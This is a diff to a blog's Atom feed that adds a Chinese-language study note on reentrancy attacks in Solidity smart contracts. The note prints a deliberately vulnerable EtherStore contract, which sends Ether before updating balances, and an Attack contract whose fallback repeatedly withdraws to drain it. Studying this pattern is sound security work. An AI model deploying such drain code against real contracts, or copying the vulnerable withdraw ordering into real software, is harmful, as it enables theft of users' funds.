@@ -2,13 +2,84 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://marknft.github.io</id>
     <title>Mark World</title>
-    <updated>2022-05-04T09:11:40.338Z</updated>
+    <updated>2022-05-05T08:46:24.944Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://marknft.github.io"/>
     <link rel="self" href="https://marknft.github.io/atom.xml"/>
     <logo>https://marknft.github.io/images/avatar.png</logo>
     <icon>https://marknft.github.io/favicon.ico</icon>
     <rights>All rights reserved 2022, Mark World</rights>
+    <entry>
+        <title type="html"><![CDATA[智能合约Solidity安全①-重入攻击]]></title>
+        <id>https://marknft.github.io/post/SoliditySecurity-1/</id>
+        <link href="https://marknft.github.io/post/SoliditySecurity-1/">
+        </link>
+        <updated>2022-05-05T07:23:08.000Z</updated>
+        <summary type="html"><![CDATA[<pre><code>事件：攻击合约A(用户)从合约B(Bank)中取款，而合约收币会启动回退函数(fallback/recieve)引发的安全问题
+</code></pre>
+]]></summary>
+        <content type="html"><![CDATA[<pre><code>事件：攻击合约A(用户)从合约B(Bank)中取款，而合约收币会启动回退函数(fallback/recieve)引发的安全问题
+</code></pre>
+<!-- more -->
+<h2 id="正文">正文</h2>
+<p>事件逻辑图：<br>
+<img src="https://marknft.github.io/post-images/1651738714317.jpg" alt="" loading="lazy"></p>
+<h3 id="全程使用使用remix在线编辑器此次操作出现的问题如下">全程使用使用Remix在线编辑器，此次操作出现的问题如下：</h3>
+<ol>
+<li>代码大小写规范，单词拼写不能出现错漏</li>
+<li>部署攻击合约需使用合约B(至于为啥？先记忆后理解)</li>
+<li>注意存取款数字和单位</li>
+</ol>
+<h3 id="代码如下">代码如下：</h3>
+<pre><code>pragma solidity ^ 0.6.10;
+
+contract EtherStore {
+    mapping(address =&gt; uint) public balances;
+    function deposit() public payable{
+        balances[msg.sender] += msg.value;
+    }
+    function withdraw(uint _amount) public {
+        require(balances[msg.sender] &gt;= _amount);
+        (bool sent, ) = msg.sender.call{ value: _amount } (&quot;&quot;);
+        require(sent, &quot;Failed to send Ether&quot;);
+        balances[msg.sender] -= _amount;
+    }
+    function getBalance() public view returns(uint) {
+        return address(this).balance;
+    }
+}
+
+
+contract Attack{
+    EtherStore public etherStore;
+    constructor(address _etherStoreAddress) public {
+        etherStore = EtherStore(_etherStoreAddress);
+    }
+    fallback() external payable {
+        if (address(etherStore).balance &gt;= 1 ether) {
+            etherStore.withdraw(1 ether);
+        }
+    }
+    function attack() external payable {
+        require(msg.value &gt;= 1 ether);
+        etherStore.deposit{ value: 1 ether } ();
+        etherStore.withdraw(1 ether);
+    }
+    function getBalance() public view returns(uint) {
+        return address(this).balance;
+    }
+}
+</code></pre>
+<hr>
+<blockquote>
+<p>这里是记录学习分享的内容，不定时发布。</p>
+</blockquote>
+<p><strong>封面图</strong><br>
+<img src="https://marknft.github.io/post-images/1651739441682.jpg" alt="" loading="lazy"><br>
+<a href="https://www.youtube.com/channel/UCS8BqjUmQbiNnr0GgqUiiBw">欢迎订阅我的Youtube频道</a></p>
+<p>(完)</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[区块链学习笔记① | 主题套利007]]></title>
         <id>https://marknft.github.io/post/blockchain-007/</id>
